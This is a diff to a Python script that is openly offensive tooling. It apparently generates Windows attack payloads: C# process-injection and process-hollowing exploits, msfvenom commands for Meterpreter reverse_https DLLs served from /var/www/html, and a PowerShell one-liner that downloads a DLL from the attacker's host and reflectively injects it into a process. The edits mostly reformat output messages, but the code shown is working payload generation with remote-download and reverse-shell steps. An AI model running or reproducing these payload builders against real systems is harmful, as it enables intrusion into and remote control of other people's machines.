@@ -1,10 +1,10 @@
- #!/bin/python3
+#!/bin/python3
 import subprocess
 import socket
 import random
 from colorama import init
 from termcolor import colored
- 
+
 init()
 
 def read_file(f):
@@ -63,9 +63,8 @@ def shellcodeDecoder(technique):
 
 
 def generateProcessInjection(technique, shellcode, arch):
-    print("[+] Process Injection")
- 
-    print(colored(f"    [+] Generating C# Process Injection exploit", 'green'))
+
+    print(colored(f"[+] Generating C# Process Injection exploit", 'green'))
 
 
     # Python shellcode encoder  
@@ -84,9 +83,8 @@ def generateProcessInjection(technique, shellcode, arch):
     f.close()
 
 def generateProcessHollowing(technique, shellcode, arch):
-    print("[+] Process hollowing")
- 
-    print(colored(f"    [+] Generating C# Process Hollowing exploit", 'green'))
+    
+    print(colored(f"[+] Generating C# Process Hollowing exploit.", 'green'))
 
 
     # Python shellcode encoder  
@@ -106,8 +104,8 @@ def generateProcessHollowing(technique, shellcode, arch):
 
 
 def dllInection(lhost, lport, arch):
-    print("[+] DLL injection")
-    print(colored(f"    [+] msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met.dll", 'green'))
+    print(colored("[+] Generating DLL injection payload", 'green'))
+    print(colored(f"    [+] msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met-{arch}.dll", 'cyan'))
     # create DLL
     # sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll`
     if (arch == "x64"):
@@ -131,8 +129,9 @@ def dllInection(lhost, lport, arch):
 
 
 def reflectiveDllInjection(lhost, lport, arch):
-    print("[+] Reflective DLL injection with PowerShell")
-     # script must be from offsec - adjusted one
+
+    print(colored("[+] Reflective DLL injection with PowerShell", 'green'))
+    
 
     payload = f"""
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/met-{arch}.dll') 
@@ -151,7 +150,7 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
     elif (arch == "x86"):
         mpayload = "windows/meterpreter/reverse_https"
 
-    print(colored(f"    [+] msfvenom -p {mpayload} LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met-{arch}.dll", 'green'))
+    print(colored(f"    [+] msfvenom -p {mpayload} LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met-{arch}.dll", 'cyan'))
 
     subprocess.run(["msfvenom", "-p", mpayload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "dll", "-o", f"/var/www/html/met-{arch}.dll" ], capture_output=True, text=True)
 
